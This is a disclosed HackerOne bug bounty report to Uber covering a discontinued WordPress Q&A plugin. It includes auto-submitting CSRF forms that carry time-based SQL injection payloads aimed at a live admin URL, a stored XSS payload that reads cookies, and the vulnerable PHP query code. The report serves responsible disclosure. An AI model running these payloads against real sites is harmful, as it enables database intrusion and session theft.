# Multiple vulnerabilities in a WordPress plugin at drive.uber.com

## Report Details
- **Report ID**: 135288
- **URL**: https://hackerone.com/reports/135288
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-04-29T02:57:55.343Z
- **Disclosed**: 2016-08-23T20:13:36.554Z

## Reporter
- **Username**: 0xsyndr0me
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Hi again,

The story begins when I started looking at https://drive.uber.com/ukmarketplace/welcome/, at the first glance I noticed that you are running WordPress 4.4.2 (which you probably know is outdated now [[1]](https://codex.wordpress.org/Version_4.5#Security) ). So first you need to update to the latest version to patch the publicly known vulnerabilities.

When I looked at the plugins, all of them were up-to-date. However, when I looked up WordPress plugins for **q-and-a** plugin, I could not find it. It was removed from WordPress. So I googled any known vulnerabilities in the plugin and I found that it's vulnerable to Full Path Disclosure but the technical details of the vulnerability went down when OSVDB decided to go down [[2]](https://wpvulndb.com/vulnerabilities/7049). 

Communicated developers but said it's no longer supported, and contacting you without a solid bug in hand would be useless, So I decided to download the latest known version from WordPress Plugin Repository [[3]] (http://plugins.svn.wordpress.org/q-and-a/trunk/) -Which is the one you are running (1.0.6.2)- and try my luck. 

## Background  
The attack requires a logged-in administrator of the blog to visit an attacker-controlled website. 

## Vulnerabilities

### SQL INJECTION(s)
I discovered that one endpoint is vulnerable to 2 SQL injection vulnerabilities due to non-escaping of certain parameters

#### 1st Vulnerability

**Steps to reproduce**
1. Create a page with the following code

```
<form action="https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnReturnParent" value="1" />
            <input type="submit" name="send" value="Save" />
</form>
<script type="text/javascript">
document.forms[0].submit();
</script>
```
2. Visit the page with a logged-in administrator account

The payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds

Vulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`

```
45. if (isset($_POST['btnReturnParent'])) { 
46. 	$parentsParent = $wpdb->get_row("SELECT post_parent FROM $wpdb->posts WHERE ID = " . $_POST['hdnParentID'], ARRAY_N);
47. 	$parentID = $parentsParent[0];
48. }
```


#### 2nd Vulnerability
**Steps to reproduce**
1. Create a page with the following code

```
<form action="https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="" />
            <input type="text" name="pages" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnSubPages" value="1" />
            <input type="submit" name="send" value="Save" />
</form>
<script type="text/javascript">
document.forms[0].submit();
</script>
```
2. Visit the page with a logged-in administrator account

The payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds

Vulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`

```
38. if (isset($_POST['btnSubPages'])) { 
39. 	$parentID = $_POST['pages'];
40. }
41. elseif (isset($_POST['hdnParentID'])) { 
42. 	$parentID = $_POST['hdnParentID'];
43. }
```

```
253. function faqpageorder_pageQuery($parentID)
254. {
255. 	global $wpdb;
256.	return $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE post_parent = $parentID and post_type = 'qa_faqs' AND post_status != 'trash' AND post_status != 'auto-draft' ORDER BY menu_order ASC");
257. }
```


### Cross-Site Scripting (XSS)
This turned out to be false positive or to be more accurate not possible to exploit remotely because the page is protected by CSRF nonce which is hard to obtain so remote attack vector will eventually fail. but since it is stored XSS, a malicious administrator can use it to inject javascript code into adminpanel.

**Steps to reproduce**
1. Log into admin panel
2. Go to Settings -> Q & A
3. Change FAQ homepage into your payload (`'"/autofocus/onfocus=alert(document.domain%2bdocument.cookie);//`)
4. Save Settings


### Cross-Site Request Forgery (CSRF)
As it has been clear from previous requests that FAQs reordering is vulnerable to CSRF which does not really pose a serious threat to the website.
**Vulnerable Endpoint:** http://localhost/wp/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder

## Final Note
Of course these are not all the bugs that exist in the plugin, I just made a quick test to prove that the plugin is vulnerable to serious threats. Do you really believe it is worth it to keep a no longer supported plugin? It's your call of course. However, when I communicated the developers of the plugin at madebyraygun.com for their assistance, this was their reply

>Sorry Abood, we have not developed or maintained that plugin for many years and do not have access to the source code or repository. The developer who was working on it more recently has pulled it from the WP repository, I believe. If you are responsible for a site that uses the plugin, **I would recommend removing it and using something that is more up to date**. 

Thank you for your time!

**References:**
[1] https://codex.wordpress.org/Version_4.5#Security
[2] https://wpvulndb.com/vulnerabilities/7049
[3] http://plugins.svn.wordpress.org/q-and-a/trunk/

## Attachments
No attachments
